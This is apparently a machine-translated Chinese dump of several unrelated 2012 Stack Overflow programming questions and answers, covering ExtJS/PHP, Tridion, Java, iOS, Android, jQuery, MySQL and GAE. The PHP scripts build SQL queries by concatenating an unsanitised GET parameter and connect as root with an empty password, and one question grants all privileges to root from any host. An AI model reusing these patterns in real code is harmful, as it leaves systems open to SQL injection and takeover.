这是php代码

```
 <?php

    //if(isset($_GET['id']))
    //{

        //$node_number = $_GET['id'];
    //}
    //else{

     //$node_number='6';
    //}
    $node_number = $_GET['id'];
    //echo $node_number;
            $conn = mysql_connect("localhost", "root", "") or die (mysql_error ());
            $db = mysql_select_db ("zan") or die (mysql_error ());
          //echo $var = "SELECT * FROM patent_table where patent_id= $node_number";

            $result=mysql_query ("SELECT * FROM patent_table where patent_id in(SELECT patent_id FROM grid_mapping WHERE node_id='" .$node_number. "')") or die (mysql_error ());
            //$result=mysql_query ("SELECT * FROM patent_table where patent_id in(SELECT patent_id FROM grid_mapping WHERE node_id='6')") or die (mysql_error ());
            //$result=mysql_query ("SELECT * FROM patent_table ") or die (mysql_error ());

            $num_rows = mysql_num_rows($result);

            $list_items = array();

            while ($row = mysql_fetch_array($result))
            {

                $item = array(
                'patent_id' => $row['patent_id'],
                'Patent_number' => $row['patent_num'],
                'Title' => $row['title'],
                'Abstract' => $row['abstract'],
                'Filing_Year' => $row['filing_year'],
                'Assignee' => $row['assignee']
                );
               $list_items[] =  $item;
            }

            //echo json_encode($data);
            echo '{total:' . $num_rows . ' , results: ' . json_encode($list_items) . '}';

            // $conn = mysql_connect("localhost", "root", "") or die (mysql_error ());
            // $db = mysql_select_db ("zan") or die (mysql_error ());

             // $iid = isset( $_GET['id'] ) ? $_GET['id'] : '';
            // //$result=mysql_query ("SELECT * FROM grid") or die (mysql_error ());
            // $result=mysql_query ("SELECT id,name,parent FROM node_table WHERE id = '".$iid."'") or die (mysql_error ());

            // $num_rows = mysql_num_rows($result);

            // $list_items = array();

            // while ($row = mysql_fetch_array($result))
            // {
                // $item = array(
                // 'Id' => $row['id'],
                // 'Name' => $row['name'],
                // 'Parent' => $row['parent']

                // );
               // $list_items[] =  $item;
            // }
            // echo $list_items;

            // //echo json_encode($data);
           // // echo '{total:' . $num_rows . ' , results: ' . json_encode($list_items) . '}';
         ?> 
```

在 .php 代码中的“id”是树帖 id 请帮助我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-15T09:21:05.273

下面的代码是 .js 文件

```
 Ext.Loader.setConfig({enabled: true});

            Ext.Loader.setPath('Ext.ux', '../ux');

            Ext.require([
                'Ext.tip.QuickTipManager',
                'Ext.container.Viewport',
                'Ext.layout.*',
                'Ext.form.Panel',
                'Ext.form.Label',
                'Ext.grid.*',
                'Ext.data.*',
                'Ext.tree.*',
                'Ext.selection.*',
                'Ext.tab.Panel',
                'Ext.ux.layout.Center'  
            ]);

            //
            // This is the main layout definition.
            //
            Ext.onReady(function(){

                Ext.tip.QuickTipManager.init();

                var store1 = Ext.create('Ext.data.JsonStore', {
                    fields: ['patent_id', 'Patent_number', 'Title','Abstract','Filing_Year','Assignee'],
                    autoLoad:false,
                    proxy: {
                        type: 'ajax',
                        reader: {
                            root: 'results'
                        }
                    }
                });

                var store = Ext.create('Ext.data.TreeStore', {
                    root: {
                        expanded: true
                    },
                    proxy: {
                        type: 'ajax',
                        url:'get-nodes.php',
                        actionMethods: 'POST'
                    }
                });

                // Go ahead and create the TreePanel now so that we can use it below
                 var treePanel = Ext.create('Ext.tree.Panel', {
                    id: 'tree-panel',
                    title: 'Sample Layouts',
                    region:'north',
                    split: true,        
                    minSize: 150,
                    rootVisible: false,
                    autoScroll: true,
                    store: store
                    //handler: function(n) {
               // Ext.Msg.alert('Navigation Tree Click');
            //},

                });

                // Assign the changeLayout function to be called on tree node click.
                treePanel.getSelectionModel().on('select', function(selModel, record) {
                var selectedNode = treePanel.getSelectionModel().getSelection();
                    if (record.get('leaf')) {
                                store1.proxy.url='json.php?id=' + selectedNode[0].data.id;
                                store1.load();

                     }
                 });

                // This is the Details panel that contains the description for each example layout.
                var tabPanel = Ext.create('Ext.tab.Panel', {
                id: 'tabs-nested-layouts-panel',
                title: 'TabPanel with Nested Layouts',
                //plain: true,
                     region: 'center',
                     margins: '0 5 5 5',
                     activeTab: 3,
                     items: [{
                         title: 'Insights',
                         bodyStyle: 'padding:10px;',
                            items:[{
                                xtype: 'htmleditor',
                                autoScroll: true,
                                width    : 500,
                                height:500,
                                anchor: '100%'
                                    }]
                     },{
                         title: 'IP Radar',
                         bodyStyle: 'padding:10px;',
                         html: 'Coming Soon.'
                     },{
                         title: 'Compeitor Radar',
                         bodyStyle: 'padding:10px;',
                         html: 'Coming Soon.'
                     },{
                                 // A common mistake when adding grids to a layout is creating a panel first,
                                 // then adding the grid to it.  GridPanel (xtype:'grid') is a Panel subclass,
                                 // so you can add it directly as an item into a container.  Typically you will
                                 // want to specify layout:'fit' on GridPanels so that they'll size along with
                                 // their container and take up the available space.
                                 title: 'Technology Radar',
                                 xtype: 'grid',
                                 layout: 'fit',
                                 store: store1,
                                 viewConfig: {
                                            emptyText: 'No Data to Display'
                                                },
                                 columns: [
                                     {
                        text: 'Patent ID',
                        flex: 50,
                        dataIndex: 'patent_id'
                    },{
                        text: 'Patent Number',
                        flex: 50,
                        dataIndex: 'Patent_number'
                    },{
                        text: 'TITLE',
                        flex: 50,
                        dataIndex: 'Title'
                    },{
                        text: 'Abstract',
                        flex: 50,
                        dataIndex: 'Abstract'
                    },{
                        text     : 'Filing Year',
                        width    : 75,
                        sortable : true,
                        dataIndex: 'Filing_Year'
                    },{
                        text: 'Assignee',
                        flex: 50,
                        dataIndex: 'Assignee'
                    }
                                 ],
                                 stripeRows: true
                             },{
                         title: 'Customize Views',
                         bodyStyle: 'padding:10px;',
                         html: 'Coming Soon.'
                     }
                             ]

                 });

                   // var detailsPanel = Ext.create('Ext.grid.Panel', {
                    // width:587,
                    // height:363,
                    // collapsible:true,
                  // renderTo: 'details-panel',
                    // title: 'Details',
                    // region: 'center',
                    // bodyStyle: 'padding-bottom:15px;background:#eee;',
                    // autoScroll: true,

                    // store: store1,
                    // multiSelect: true,
                    // viewConfig: {
                        // emptyText: 'No images to display'
                    // },

                    // columns: [{
                        // text: 'Patent ID',
                        // flex: 50,
                        // dataIndex: 'patent_id'
                    // },{
                        // text: 'Patent Number',
                        // flex: 50,
                        // dataIndex: 'Patent_number'
                    // },{
                        // text: 'TITLE',
                        // flex: 50,
                        // dataIndex: 'Title'
                    // },{
                        // text: 'Abstract',
                        // flex: 50,
                        // dataIndex: 'Abstract'
                    // },{
                        // text     : 'Filing Year',
                        // width    : 75,
                        // sortable : true,
                        // dataIndex: 'Filing_Year'
                    // },{
                        // text: 'Assignee',
                        // flex: 50,
                        // dataIndex: 'Assignee'
                    // }]
                // });

                // Finally, build the main layout once all the pieces are ready.  This is also a good
                // example of putting together a full-screen BorderLayout within a Viewport.
                Ext.create('Ext.Viewport', {
                    layout: 'border',
                    title: 'Ext Layout Browser',

                    items: [{
                        xtype: 'box',
                        id: 'header',
                        region: 'north',
                        html: '<h1> Ext.Layout.Browser</h1>',
                        height: 30
                    },{
                        layout: 'border',
                        id: 'layout-browser',
                        region:'west',
                        border: false,
                        split:true,
                        margins: '2 0 5 5',
                        width: 275,
                        minSize: 100,
                        maxSize: 500,
                        items: [treePanel]
                    }, 
                        tabPanel
                    ],
                    renderTo: Ext.getBody()
                });
            }); 
```

这段代码是 json.php

```
<?php

//if(isset($_GET['id']))
//{

    $node_number = $_GET['id'];
//}

//$node_number = $_GET['6'];
//echo $node_number;
        $conn = mysql_connect("localhost", "root", "") or die (mysql_error ());
        $db = mysql_select_db ("zan") or die (mysql_error ());
      //echo $var = "SELECT * FROM patent_table where patent_id= $node_number";

        $result=mysql_query ("SELECT * FROM patent_table where patent_id in(SELECT patent_id FROM grid_mapping WHERE node_id='" .$node_number. "')") or die (mysql_error ());
        //$result=mysql_query ("SELECT * FROM patent_table where patent_id in(SELECT patent_id FROM grid_mapping WHERE node_id='6')") or die (mysql_error ());
        //$result=mysql_query ("SELECT * FROM patent_table ") or die (mysql_error ());

        $num_rows = mysql_num_rows($result);

        $list_items = array();

        while ($row = mysql_fetch_array($result))
        {

            $item = array(
            'patent_id' => $row['patent_id'],
            'Patent_number' => $row['patent_num'],
            'Title' => $row['title'],
            'Abstract' => $row['abstract'],
            'Filing_Year' => $row['filing_year'],
            'Assignee' => $row['assignee']
            );
           $list_items[] =  $item;
        }
    // echo  $list_items['href'] = 'layout-browser.php?ptd='.$node_number;
    //  echo $list_items['hrefTarget']='layout-browser.php?ptd='.$node_number;
        //echo json_encode($data);
        echo '{total:' . $num_rows . ' , results: ' . json_encode($list_items) . '}';

        // $conn = mysql_connect("localhost", "root", "") or die (mysql_error ());
        // $db = mysql_select_db ("zan") or die (mysql_error ());

         // $iid = isset( $_GET['id'] ) ? $_GET['id'] : '';
        // //$result=mysql_query ("SELECT * FROM grid") or die (mysql_error ());
        // $result=mysql_query ("SELECT id,name,parent FROM node_table WHERE id = '".$iid."'") or die (mysql_error ());

        // $num_rows = mysql_num_rows($result);

        // $list_items = array();

        // while ($row = mysql_fetch_array($result))
        // {
            // $item = array(
            // 'Id' => $row['id'],
            // 'Name' => $row['name'],
            // 'Parent' => $row['parent']

            // );
           // $list_items[] =  $item;
        // }
        // echo $list_items;

        // //echo json_encode($data);
       // // echo '{total:' . $num_rows . ' , results: ' . json_encode($list_items) . '}';
     ?> 
```

这是上面代码的答案

# tridion - 在 SDL Tridion 2011 中运行 VBScript 自定义页面

> ID：13841722
> 
> 赞同：4
> 
> 时间：2012-12-12T14:15:10.120
> 
> 标签：tridion

我们有许多用 VBScript 为 SDL Tridion 5.2 编写的自定义脚本。这些脚本使用 TOM API 对 Tridion 对象执行大量批量操作。

在最近升级到 2011 SP1 之后，我们现在需要更改大量组件演示中使用的组件模板，最好的方法是运行脚本来更新必要的页面和组件演示。

以前，我们可以运行一些类似于以下代码的 VBScript 来进行此更改。在 2011 年，我们还能运行这些脚本来进行这种改变吗？

是否像在 Content Manager 服务器 (Windows 2008 R2) 上启用 Classic ASP 一样简单？

```
<%
'##### CREATE TRIDION API OBJECTS #####
Set TDSE = Server.CreateObject("TDS.TDSE")
Call TDSE.Initialize()

'##### CALL FUNCTION - PASS IN STRUCTURE GROUP STARTING POINT #####
Call UpdateComponentTemplates(TDSE.GetObject("tcm:44-39929-4", OpenModeEditWithFallback, "tcm:0-44-1"))

Sub UpdateComponentTemplates(arg_strStructureGroup)
    '##### GET ALL ITEMS WITHIN SPECIFIED STRUCTURE GROUP #####
    For Each objItem In arg_strStructureGroup.GetItems
        '##### IF ITEM IS A STRUCTURE GROUP #####
        If TypeName(objItem) = "StructureGroup" Then
            '##### CALL THE FUNCTION AGAIN, PASSING IN THE STRUCTURE GROUP #####
            Call UpdateComponentTemplates(objItem)
        End If
        '##### IF ITEM IS A PAGE #####
        If TypeName(objItem) = "Page" Then
            For Each objComponent In objItem.ComponentPresentations
                '##### CHECK EXISTING COMPONENT TEMPLATE & UPDATE WITH THE NEW ONE #####
                If objComponent.ComponentTemplate.ID = "tcm:44-493-32" Then
                    'objComponent.ComponentTemplate = "tcm:44-216181-32"
                    'objItem.Save(True)
                    '##### OUTPUT STATUS MESSAGE #####
                    Response.Write(objItem.Title & " ......................... UPDATED<br />") & vbCrlf
                    Response.Flush()
                End If
            Next
        End If
    Next
End Sub

Response.Write("<p>Job Done!!!</p>") & vbCrlf

'##### CLEAN UP OBJECTS #####
Set TDSE = Nothing
%> 
```

我知道这可能可以使用核心服务来完成，但是在不了解此代码或 .Net 的情况下，是否仍然可以使用 VBScript 来执行此操作？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T14:39:02.840

是的，这在 2011 年有效，因为仍然支持 TOM COM+ API。我最近在 2011 系统上成功运行了一个非常相似的脚本。如果您要更新很多项目，您可能希望将其移动到 .net 控制台应用程序，因为模板或网页可能会超时。如果这样做，请确保对所有 TOM 对象使用 marshal.releaseobject。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T15:46:13.467

正如罗伯特所说，这将起作用。如果您不想启用经典 ASP，您可以考虑将代码片段放在页面或组件模板中，然后在以特权用户身份登录时使用新模板预览项目。这将以相同的方式执行模板。尽管如果您预计执行时间很长，您可能会得到类似于 Robert 描述的 ASP 超时的模板超时。

完成后请确保删除或隐藏您的“代码”模板。

# java - 在类似 API 的 Facade 上下文中允许使用的 instanceof

> ID：13841728
> 
> 赞同：0
> 
> 时间：2012-12-12T14:15:43.637
> 
> 标签：java, instanceof, facade

我们这些在教堂/清真寺/犹太教堂/等处做礼拜的人。面向对象的设计经常在`instanceof`. 我的问题是它是否是允许的，此外，在给定的上下文中更可取的是，您希望让另一个开发人员能够将预期类型的​​可变参数混合传递给一个入口点函数（`foo`），以使他们的代码更简洁/更简单（又名正面）：

```
 // a lightweight demo of the integral idea behind the Facade DP...

public void foo(Object... objs){

 for(Object o : objs){
        if(o instanceof Integer) bar((Integer)o); 
        else if(o instanceof MyCustomType) bar((MyCustomType)o); 
        else if(o instanceof String) bar((String)o);
        //else{...} ignore? report exception?
    }

}

private void bar(int i){
  System.out.println("integer overload invoked");

}

private void bar(String s){
  System.out.println("String overload invoked");

}

private void bar(MyCustomType instance){
  System.out.println("MyCustomType overload invoked");

} 
```

是的，这可以说有点笨拙，但是假设除了被视为对象之外，三种类型（整数、字符串、MyCustomType）之间没有多态性，与`instanceof`为每种预期类型编写辅助包装器对象相比，使用起来不是更容易：

```
private abstract class Wrapper<T>{

  abstract void meth(T t);
}

private class StringWrapper extends Wrapper<String>{

   @Override
   void meth(String s){

       System.out.println("String overload invoked");
   }
}

// etc... 
```

就 OO 而言，这是更好的设计，但您是否应该始终使用包装器方法？

或者这种方法在效率或内存方面甚至可能存在缺点？并且看到使用`instanceof`仅限于调用Facade隐藏的一些方法，你甚至可以推荐这种风格吗？毕竟，在这种情况下，包装类的重用范围是有限的，因为它们具有纯粹的父类范围。

在这种特定情况下，这两种方法的优缺点是什么？

# objective-c - 从展开 segue 方法执行SegueWithIdentifier 时收到警告（嵌套弹出动画可能导致导航栏损坏）

> ID：13841729
> 
> 赞同：3
> 
> 时间：2012-12-12T14:15:42.967
> 
> 标签：objective-c, ipad, cocoa-touch, ios6, storyboard

我有一个场景，我称之为另一个模态场景。一旦模态场景完成或单击模态场景上的确定按钮，我将调用展开转场以返回主场景。我的 unwind segue 方法是在第一个场景中定义的。在 unwind segue 方法中，我调用了另一个推送场景，但在“嵌套弹出动画可能导致导航栏损坏”中收到以下警告，这最终导致我的应用程序崩溃

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-15T18:12:55.973

该错误肯定是由一次多次发送弹出视图控制器消息触发的。我建议你检查你的代码，也许你不知道有什么东西触发了这个动作。没有看到你的代码很难说。

在我的情况下，我在 nsnotification 出现后弹出视图控制器，但我忘记删除观察者，所以我的代码第二次执行弹出视图控制器两次，因此警告消息“嵌套弹出动画......”

# android - 使截图代码支持多种屏幕尺寸

> ID：13841733
> 
> 赞同：0
> 
> 时间：2012-12-12T14:16:01.720
> 
> 标签：android

我有一堂课，我在其中截取布局的屏幕截图并将其存储为 JPEG 文件....我遇到的问题是图像大小随屏幕分辨率而变化....例如。如果我使用中等分辨率的手机，图像大小约为 50-60kb，但对于高分辨率，它会达到 1.5mbs....那么有什么方法可以让图像大小保持不变，不受屏幕大小或分辨率的影响？？？

```
public class abc extends Activity {
    View content;
    String fileName, fname;
    static File file;
    static String RECE;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.rece);
        ImageView iv = (ImageView) findViewById(R.id.Ivsignature);
        iv.setImageBitmap(Signature.sign);
        Initialize();

        content = findViewById(R.id.Rlrece);
        ViewTreeObserver vto = content.getViewTreeObserver();
        vto.addOnGlobalLayoutListener(new OnGlobalLayoutListener() {
            @SuppressWarnings("deprecation")
            public void onGlobalLayout() {
                content.getViewTreeObserver()
                        .removeGlobalOnLayoutListener(this);
                getScreen();
            }
        });

    }

    private void getScreen() {
        View view = content;
        View v = view.getRootView();
        v.setDrawingCacheEnabled(true);
        Bitmap b = v.getDrawingCache();

        String myPath = Environment.getExternalStorageDirectory() + "/Rece";
        File myDir = new File(myPath);
        try {
            myDir.mkdirs();
        } catch (Exception e) {
        }

        fname = fileName + ".jpg";
        file = new File(myDir, fname);
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(file);
            b.compress(CompressFormat.JPEG, 100, fos);
            // Toast.makeText(getApplicationContext(), fname + "  saved",
            // Toast.LENGTH_LONG).show();
            Intent my = new Intent(getApplicationContext(),
                    DialogActivity.class);
            my.putExtra("Rsystrace", DialogActivity.Systrace);
            startActivityForResult(my, 1);
        } catch (Throwable ex) {
            Toast.makeText(getApplicationContext(),
                    "error: " + ex.getMessage(), Toast.LENGTH_LONG).show();

        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:19:10.293

当您进行屏幕截图时，您当然会有与屏幕尺寸相关的图像（图像的分辨率不同，因为屏幕不同）。

您可以根据需要压缩或调整位图大小，然后调整为固定大小 - 文件大小将固定。

PS。我建议您使用除 JPEG 之外的 PNG。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:34:35.563

您可以创建一个对象 BitmapFactory.Options() 并在给定比例因子的情况下设置属性 inSampleSize（您需要计算它）。比您可以在 BitmapFactory.decodeFile() 中使用像您想要的大小拍摄图像（基于 inSampleSize）。

- 编辑 -

使用“photoPath”磁盘中的图像的示例：

```
 BitmapFactory.Options bmOptions = new BitmapFactory.Options();
    BitmapFactory.decodeFile(photoPath, bmOptions);

    int photoW = bmOptions.outWidth;
    int photoH = bmOptions.outHeight;

    int scaleFactor = Math.min(newWidth/width, newHeigth/heigth);
    bmOptions.inSampleSize = scaleFactor;

    Bitmap bitmap = BitmapFactory.decodeFile(photoPath, bmOptions);

    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, bytes);
    FileOutputStream fos;
    fos = new FileOutputStream(photoPath);
    fos.write(bytes.toByteArray());
    fos.close(); 
```

# javascript - 如何更换一个 一个 div 里面的 div id？

> ID：13841738
> 
> 赞同：0
> 
> 时间：2012-12-12T14:16:23.337
> 
> 标签：javascript, jquery

如何`<ul>`在 jQuery 中使用 div 的 id 替换 div 内部的

```
<div id="example">
    <ul>
        Content To Be Replaced...........
    <ul>
</div> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T14:17:48.427

```
$("#example ul").text('Content to replace'); 
```

您可以使用 ID 选择器选择 div `#`。空格用作后代选择器，并`.text`更改文本内容。您还可以使用`.html`来替换 HTML 内容。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T14:18:32.490

只需这样做：

```
$("#example ul").html('New Content'); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:18:37.797

我想你的意思是这样的？

```
$('#example ul').html('new content'); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-12T14:19:27.337

绝对不需要 jQuery：

```
var div = document.getElementById("example");
div.firstChild.nextSibling.textContent="bla";​ //div
//   textnode ->   ul   -> text 
```

这可以压缩为：

```
document.getElementById("example").firstChild.nextSibling.textContent="bla";​
//                div     -->      textnode -->   ul  --> text 
```

[是的](http://jsperf.com/jquery-vs-js-dom)**，它比 jQuery 代码更多，但也[**快得多**](http://jsperf.com/jquery-vs-js-dom)[。](http://jsperf.com/jquery-vs-js-dom).**

 **你甚至可以使用：

```
document.querySelector('#example ul').textContent="bla"; 
```

仍然是 jQuery 的 4-5 倍，但使用非常相似的语义语法。无需放弃原生 JS，因为它“难”或任何东西。**

# jquery - JQuery 移动、验证插件和可折叠内容块

> ID：13841745
> 
> 赞同：0
> 
> 时间：2012-12-12T14:16:50.907
> 
> 标签：jquery, validation, jquery-mobile

我对这种情况有疑问（http://jsfiddle.net/LFG8G/）。在我的移动页面中，有一个选择菜单元素，其中包含一组值（在我的示例中为 01,02,03）以及可折叠内容块内的一组其他控件。

表格如下所示：

```
<div data-role="page" id="pagina">
    <form action="http://www.google.com" method="get" id="form1">
        <div data-role="content">
            <select name="myOption" id="myOption" data-native-menu="false">
                <option value="">&nbsp;</option>
                <option value="01">Value 01</option>
                <option value="02">Value 02</option>
                <option value="03">Value 03</option>

            </select>
            <input type="submit" data-role="button" value="Validate" />
            <div data-role="collapsible">
                <h3>Other fields</h3>
                <div>
                    <div data-role="fieldcontain">
                        <label for="f1"><strong>Field 1</strong></label>
                        <input type="text" name="f1" id="f1" />
                    </div>
                    <div data-role="fieldcontain">
                        <label for="f2"><strong>Field 2</strong></label>
                        <input type="text" name="f2" id="f2" />
                    </div>
                </div>
            </div>
        </div>
    </form>
</div> 
```

我必须在将数据提交到服务器之前验证字段，并且我使用了 jquery 验证插件。

选择特定选项菜单（项目 01）时，必须填写内容块中的字段。

我已经为此编写了规则，但是当按下按钮验证时，如果用户看不到内容，则不执行验证代码。

javascript看起来像这样：

```
 $(document).live('pageshow', function (event, ui) {
        $('#form1').validate({
            ignore:'',
            rules: {
                myOption: {
                    required: true
                },
                f1: {
                    required: {

                        depends: function (el) {
                            if ($('#myOption').val() == "01") {
                                return true;
                            } else {
                                return false;
                            }
                        }
                    }
                },
                f2: {
                    required: {

                        depends: function (el) {
                            if ($('#myOption').val() == "01") {
                                return true;
                            } else {
                                return false;
                            }
                        }
                    }
                }
            }
        });
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T16:21:47.977

默认情况下，验证插件不验证隐藏字段。您需要做的是在您的验证调用中添加一个选项来关闭它：

```
$('#form1').validate({
   ignore:'',
   //your other options
}); 
```

就是这样。看到它在这里工作：http: [//jsfiddle.net/ryleyb/LFG8G/1/](http://jsfiddle.net/ryleyb/LFG8G/1/)

# php - 授予用户权限在 MySQL 中不起作用

> ID：13841748
> 
> 赞同：0
> 
> 时间：2012-12-12T14:16:59.327
> 
> 标签：php, mysql

我在[phpMyAdmin](http://en.wikipedia.org/wiki/PhpMyAdmin)中执行了这个。

我执行了这些行：

```
CREATE USER root IDENTIFIED BY PASSWORD '';

GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; 
```

我在尝试连接时得到这个：

> 连接失败：SQLSTATE [HY000] [1045] 用户'root'@'localhost'的访问被拒绝（使用密码：否）

```
$dsn = 'mysql:dbname=one';
$user = 'root';
$password = '';
$pdo = "Not set";
try{
    $pdo=new PDO($dsn, $user, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_WARNING);
}
catch(Exception $ex){
    echo "Connect failed: " . $ex->getMessage();
} 
```

请注意，上面的连接曾经可以工作..现在不行（因为我切换到 XAMPP）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:35:12.087

你确定root用户没有密码吗？您是否 安装了[PhpMyAdmin](http://en.wikipedia.org/wiki/PhpMyAdmin)来检查这个？

如果问题不是特权，那么它可能是端口。MySQL 的默认端口是 3306，所以如果你的 MySQL 端口现在是 82，你必须在连接中添加端口。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:37:43.547

请检查[创建用户规范](http://dev.mysql.com/doc/refman/5.1/en/account-names.html)，似乎您应该使用另一种语法作为帐户名称

*   帐户名称的语法是 'user_name'@'host_name'。

所以，像 `CREATE USER 'root'@'localhost' IDENTIFIED BY PASSWORD '';`. 在你的情况下`CREATE USER 'root'@'%';`，但我真的不建议使用`'%'`root 用户。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:39:11.733

更改权限后是否刷新权限？

您应该执行`FLUSH PRIVILEGES;`以告诉服务器重新加载授权表。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T14:50:43.953

主机`%`不适用于`localhost`. 您需要单独授予 localhost 的权限。

# java - 文件 I/O 时出现 java.lang.NullPointerException

> ID：13841749
> 
> 赞同：0
> 
> 时间：2012-12-12T14:17:02.743
> 
> 标签：java, nullpointerexception, java.util.scanner

当我运行代码时，我得到一个错误。奇怪的是，当我更改`files.getTimeScore();`为时`files.getLineScore();`，它执行时没有错误。但是，这些功能几乎彼此相同。

当我`getTimeScore()`从类中的 main 运行该方法时`FileIO`，它可以正常工作。

### 错误

```
Exception in thread "AWT-EventQueue-0" java.lang.NullPointerException
at tetris.FileIO.loadHighscores(FileIO.java:52)
at tetris.FileIO.getTimeScores(FileIO.java:31)
at tetris.HighScores.<init>(HighScores.java:39)
at tetris.Menu$2.actionPerformed(Menu.java:74)
at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2018)
at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2341)
at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)
at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)
at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(BasicButtonListener.java:252)
at java.awt.Component.processMouseEvent(Component.java:6505)
at javax.swing.JComponent.processMouseEvent(JComponent.java:3321)
at java.awt.Component.processEvent(Component.java:6270)
at java.awt.Container.processEvent(Container.java:2229)
at java.awt.Component.dispatchEventImpl(Component.java:4861)
at java.awt.Container.dispatchEventImpl(Container.java:2287)
at java.awt.Component.dispatchEvent(Component.java:4687)
at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4832)
at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4492)
at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4422)
at java.awt.Container.dispatchEventImpl(Container.java:2273)
at java.awt.Window.dispatchEventImpl(Window.java:2719)
at java.awt.Component.dispatchEvent(Component.java:4687)
at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:723)
at java.awt.EventQueue.access$200(EventQueue.java:103)
at java.awt.EventQueue$3.run(EventQueue.java:682)
at java.awt.EventQueue$3.run(EventQueue.java:680)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:87)
at java.awt.EventQueue$4.run(EventQueue.java:696)
at java.awt.EventQueue$4.run(EventQueue.java:694)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
at java.awt.EventQueue.dispatchEvent(EventQueue.java:693)
at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:244)
at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:163)
at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:151)
at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:147)
at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:139)
at java.awt.EventDispatchThread.run(EventDispatchThread.java:97) 
```

### 代码

高分班

```
public HighScores(){
    // init A
    super("Highscores");
    c=getContentPane();
    test = new String[100][2];
    files = new FileIO();

    mainPanel = new JPanel();
    test = files.getTimeScores();
    timeTable = new JTable(test,timeTitles );
    test = files.getLineScores();
    lineTable = new JTable(test,lineTitles ); 
```

FileIO 类

```
import java.io.File;
import java.io.InputStream;
import java.io.Writer;
import java.util.Scanner;

public class FileIO {
    private File file;
    private Scanner filescScanner, lineScanner;
    private Writer fileWriter, lineWriter;
    private String[][] data;

    public FileIO () {
        data = new String[100][2];
    }

    public String[][] getLineScores(){
        return this.loadHighscores(this.getClass().getResourceAsStream("LineHighscores.txt"));
    }

    public String[][] getTimeScores(){
        return this.loadHighscores(this.getClass().getResourceAsStream("TimeHighscores.txt"));
    }

    public String[][] loadHighscores( InputStream resourceStream){
        int x=0;
        String test = "";

        filescScanner = new Scanner(resourceStream);

        while(filescScanner.hasNextLine()&& x<100) {
            lineScanner = new Scanner(filescScanner.nextLine());
            lineScanner.useDelimiter("-/-");

            data[x][0]=lineScanner.next();//name
            data[x][1]=lineScanner.next();//data
            x++;
        }
        lineScanner.close();
        filescScanner.close();
        return data;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:19:36.557

我猜你的 lineScanner 是空的。看不到你在 FileIO 中初始化它的位置。您只能在 while 子句中初始化它。因此，如果您的文件为空，则在您尝试关闭它时它仍然为空。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:29:10.080

TimeHighscores.txt 文件的行扫描器为空。所以这意味着while循环没有被执行——甚至一次都没有。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:33:07.157

你不测试那些文件是可以访问的。即如果`resourceStream`为空。

使用这种方法是不明智的，因为如果您想添加高分，就无法轻松更新这些文件。

# python - linux CI服务器上的GAE

> ID：13841755
> 
> 赞同：1
> 
> 时间：2012-12-12T14:17:15.540
> 
> 标签：python, google-app-engine, jenkins, continuous-integration, nosetests

伙计们，我们正在尝试设置 CI 测试环境来测试我们的 GAE 应用程序。我们的 CI 服务器在 linux 和 Jenkins 上运行。本地的nosetests 和nosegunit 工作得很好；但是，在 CI 服务器上，由于本身没有任何安装程序，GAE python 模块没有“注册”，因此鼻子或 python 无法找到。任何提示如何使此设置工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:46:28.123

如果您正在谈论单元测试，请为您的应用程序编写一个 setup.py 文件，其中列出了所需的包。

```
#!/usr/bin/env python

from distutils.core import setup

setup(name='myapp',
      version='1.0',
      description='This is a cool webapp by Syrahn.',
      author='Syrahn',
      requires=['googleappengine','nosetests',], #etc
     ) 
```

然后，作为 Jenkins 工作的一个步骤，设置一个 virtualenv，然后构建您的应用程序并将其安装到 virtualenv 中。这还将安装所需的库，例如：

```
virtualenv myenv
myenv/bin/python setup.py sdist 
myenv/bin/pip install mypackage.tar.gz 
```

..在此之后您可以运行单元测试：

```
myenv/bin/nosetests 
```

